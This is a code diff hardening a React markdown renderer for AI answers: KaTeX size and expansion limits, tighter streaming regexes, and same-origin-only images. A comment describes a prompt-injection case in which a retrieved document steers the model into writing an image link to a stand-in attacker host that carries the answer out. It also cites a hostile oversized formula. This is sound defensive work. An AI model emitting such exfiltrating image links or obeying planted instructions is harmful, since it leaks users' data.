@@ -2,7 +2,7 @@
 
 import { Circle, CircleCheck } from 'lucide-react'
 import { HorizontalScroll } from '@/components/ui/horizontal-scroll'
-import { type FC, type ReactNode, createContext, memo, useContext, useMemo } from 'react'
+import { type FC, type ReactNode, createContext, memo, useContext, useMemo, useState } from 'react'
 import { useTranslations } from '@/i18n'
 import dynamic from 'next/dynamic'
 import ReactMarkdown, { type Components, type ExtraProps, type Options } from 'react-markdown'
@@ -101,7 +101,20 @@ import {
 import { useRowActionRenderer } from './answer-block-context'
 
 /** Module-level so the list keeps one identity: a new array re-parses the document. */
-const REHYPE_PLUGINS: PluggableList = [[rehypeKatex, { throwOnError: false }], rehypeTableShape, rehypeDirectiveShape]
+/**
+ * KaTeX bounded: `maxSize` caps every user-given size (a `\rule{3000em}{3000em}`
+ * laid over the answer) in em, and `maxExpand` the macro expansions a hostile
+ * formula can make the main thread do. `trust` stays off, so `\href` and
+ * `\includegraphics` are refused.
+ */
+const KATEX_OPTIONS = { throwOnError: false, maxSize: 20, maxExpand: 200 }
+const REHYPE_PLUGINS: PluggableList = [[rehypeKatex, KATEX_OPTIONS], rehypeTableShape, rehypeDirectiveShape]
+/** The last block of a text still arriving: its last table row may be half-written (`directive-shape.ts`). */
+const REHYPE_PLUGINS_OPEN: PluggableList = [
+  [rehypeKatex, KATEX_OPTIONS],
+  rehypeTableShape,
+  [rehypeDirectiveShape, { openTail: true }],
+]
 
 /**
  * A ```mermaid fence, drawn instead of printed.
@@ -235,16 +248,21 @@ export function stabilizeStreamingMarkdown(raw: string): string {
 export function holdHalfDirective(content: string): string {
   const cut = content.lastIndexOf('\n') + 1
   const line = content.slice(cut)
-  const fences = content.match(/^\s*(```|~~~)/gm)?.length ?? 0
+  const fences = content.match(/^[ \t]*(```|~~~)/gm)?.length ?? 0
   if (fences % 2 === 1) return content
   // A fence line in progress: `::`, `:::`, `:::detai`, `:::details[Was es br`.
   // Colons alone are a closer only when a block is open, and a closer is
   // complete as typed.
   if (/^\s*:{2,}$/.test(line)) return openContainers(content.slice(0, cut)) > 0 && /:{3}/.test(line) ? content : content.slice(0, cut)
   if (/^\s*:{3,}[A-Za-z][\w-]*\[[^\]]*$/.test(line)) return content.slice(0, cut)
-  // An inline directive whose label is still open.
-  const inline = /(^|[^\w:]):[A-Za-z][\w-]*\[[^\]]*$/.exec(line)
-  return inline ? content.slice(0, cut + inline.index + inline[1].length) : content
+  // An opener whose `{attributes}` are still being typed: `:::cases{by=escape_le`.
+  if (/^\s*:{3,}[A-Za-z][\w-]*(?:\[[^\]]*\])?\{[^}]*$/.test(line)) return content.slice(0, cut)
+  // An inline directive whose label is still open. Only the text after the
+  // line's last `]` can hold one, and only that tail is scanned: the pattern
+  // over the whole line restarts at every `:name[` on it, per token.
+  const from = line.lastIndexOf(']') + 1
+  const inline = /(^|[^\w:]):[A-Za-z][\w-]{0,63}\[[^\]]*$/.exec(line.slice(from))
+  return inline ? content.slice(0, cut + from + inline.index + inline[1].length) : content
 }
 
 /** How many directive blocks are open at the end of `content`. */
@@ -266,7 +284,7 @@ function openContainers(content: string): number {
  * which the renderer draws cell by cell.
  */
 function closeOpenBold(content: string): string {
-  const fences = content.match(/^\s*(```|~~~)/gm)?.length ?? 0
+  const fences = content.match(/^[ \t]*(```|~~~)/gm)?.length ?? 0
   if (fences % 2 === 1) return content
   const line = content.slice(content.lastIndexOf('\n') + 1)
   if (line.trimStart().startsWith('|')) return content
@@ -306,6 +324,12 @@ interface MarkdownRenderState {
   streamingLines: readonly string[] | null
   /** The whole text is still arriving (any block, not only the last). */
   streaming: boolean
+  /**
+   * This view drew the text while it arrived. An all-clear check then stays
+   * open when the stream ends: folding the table the reader was reading would
+   * shrink the page under them. The next mount collapses it.
+   */
+  streamedHere: boolean
 }
 
 const NO_HEADINGS: ReadonlyMap<number, string> = new Map()
@@ -315,6 +339,7 @@ const MarkdownRenderStateContext = createContext<MarkdownRenderState>({
   headingIds: NO_HEADINGS,
   streamingLines: null,
   streaming: false,
+  streamedHere: false,
 })
 
 const useMarkdownRenderState = (): MarkdownRenderState => useContext(MarkdownRenderStateContext)
@@ -615,8 +640,9 @@ function MarkdownTable({ children, node }: React.ComponentPropsWithoutRef<'table
   const outcomeLabel = useOutcomeLabel()
   // Collapsed only once the block has arrived: a check that folds away while
   // it streams would make the answer jump up under the reader.
-  const { streaming } = useMarkdownRenderState()
-  const passed = node?.properties?.dataCollapsed === 'true' && !streaming ? Number(node.properties.dataPassCount) : 0
+  const { streaming, streamedHere } = useMarkdownRenderState()
+  const passed =
+    node?.properties?.dataCollapsed === 'true' && !streaming && !streamedHere ? Number(node.properties.dataPassCount) : 0
   const frame = (
     <div className={tableFrameClass(variant)} data-variant={variant === 'plain' ? undefined : variant}>
       {tally.length > 0 && !passed && (
@@ -892,21 +918,32 @@ const MARKDOWN_COMPONENTS = {
   // Images: bounded, softened, and lazy. Without the mapping an image
   // rendered at natural size with square corners and loaded eagerly —
   // and a broken source showed the browser's raw glyph full-bleed.
-  img: ({ src, alt }: React.ComponentPropsWithoutRef<'img'> & ExtraProps) => (
-    // Markdown images come from arbitrary hosts the Next image loader is
-    // not configured for; `next/image` would 400 on every one of them.
-    // eslint-disable-next-line @next/next/no-img-element
-    <img
-      src={src}
-      alt={alt ?? ''}
-      loading="lazy"
-      className="border-base my-3 h-auto max-w-full rounded-xl border"
-    />
-  ),
+  //
+  // Only an image this origin serves is loaded. The text is the model's, and a
+  // retrieved document can steer it into `![](https://attacker/?d=<answer>)`,
+  // which the browser would fetch on render, with no click, carrying whatever
+  // the model put in the query. Any other source is drawn as a link the
+  // reader chooses to open.
+  img: ({ src, alt }: React.ComponentPropsWithoutRef<'img'> & ExtraProps) =>
+    typeof src === 'string' && isSameOriginPath(src) ? (
+      // `next/image` needs a configured loader per host; these are the app's own paths.
+      // eslint-disable-next-line @next/next/no-img-element
+      <img src={src} alt={alt ?? ''} loading="lazy" className="border-base my-3 h-auto max-w-full rounded-xl border" />
+    ) : typeof src === 'string' && src ? (
+      <a href={src} target="_blank" rel="noopener noreferrer nofollow" className="text-brand underline underline-offset-2 hover:opacity-80">
+        {alt || src}
+      </a>
+    ) : (
+      <>{alt ?? ''}</>
+    ),
 } as Components
+
+/** A path this origin serves (`/api/files/…`), never a protocol-relative `//host`. */
+const isSameOriginPath = (src: string): boolean => /^\/(?![\/\\])/.test(src)
 
 /** The rehype list of every block after the first: the document's own, then the separator the whole document puts before a block. */
 const REHYPE_PLUGINS_AFTER_FIRST: PluggableList = [...REHYPE_PLUGINS, rehypeBlockSeparator]
+const REHYPE_PLUGINS_OPEN_AFTER_FIRST: PluggableList = [...REHYPE_PLUGINS_OPEN, rehypeBlockSeparator]
 
 type FootnoteOptions = NonNullable<Options['remarkRehypeOptions']>
 
@@ -922,6 +959,8 @@ interface MarkdownBlockViewProps {
   open: boolean
   /** The text is streaming at all. */
   streaming: boolean
+  /** This view drew the text while it arrived. */
+  streamedHere: boolean
   remarkPlugins: PluggableList
   rehypePlugins: PluggableList
   footnoteOptions: FootnoteOptions
@@ -941,6 +980,7 @@ const MarkdownBlockView = memo(function MarkdownBlockView({
   compact,
   open,
   streaming,
+  streamedHere,
   remarkPlugins,
   rehypePlugins,
   footnoteOptions,
@@ -954,8 +994,8 @@ const MarkdownBlockView = memo(function MarkdownBlockView({
   // fence still being written; trailing blank lines do not end a block.
   const streamingLines = useMemo(() => (open ? source.trimEnd().split('\n') : null), [open, source])
   const renderState = useMemo(
-    (): MarkdownRenderState => ({ compact, headingIds: ids, streamingLines, streaming }),
-    [compact, ids, streamingLines, streaming]
+    (): MarkdownRenderState => ({ compact, headingIds: ids, streamingLines, streaming, streamedHere }),
+    [compact, ids, streamingLines, streaming, streamedHere]
   )
   return (
     <MarkdownRenderStateContext.Provider value={renderState}>
@@ -1011,6 +1051,9 @@ function headingIdsByBlock(content: string, blocks: readonly MarkdownBlock[]): s
 export const MarkdownRenderer: FC<MarkdownRendererProps> = memo(
   ({ content, className = '', compact = false, isStreaming = false, remarkPlugins }) => {
     const t = useTranslations('common')
+    // Set during render, the documented way to derive state from a prop's history.
+    const [streamedHere, setStreamedHere] = useState(isStreaming)
+    if (isStreaming && !streamedHere) setStreamedHere(true)
     const footnoteOptions = useMemo(
       (): FootnoteOptions => ({
         footnoteLabel: t('markdown.footnotes'),
@@ -1059,8 +1102,17 @@ export const MarkdownRenderer: FC<MarkdownRendererProps> = memo(
               compact={compact}
               open={isStreaming && last}
               streaming={isStreaming}
+              streamedHere={streamedHere}
               remarkPlugins={last ? plugins.last : plugins.notLast}
-              rehypePlugins={index === 0 ? REHYPE_PLUGINS : REHYPE_PLUGINS_AFTER_FIRST}
+              rehypePlugins={
+                isStreaming && last
+                  ? index === 0
+                    ? REHYPE_PLUGINS_OPEN
+                    : REHYPE_PLUGINS_OPEN_AFTER_FIRST
+                  : index === 0
+                    ? REHYPE_PLUGINS
+                    : REHYPE_PLUGINS_AFTER_FIRST
+              }
               footnoteOptions={footnoteOptions}
             />
           )
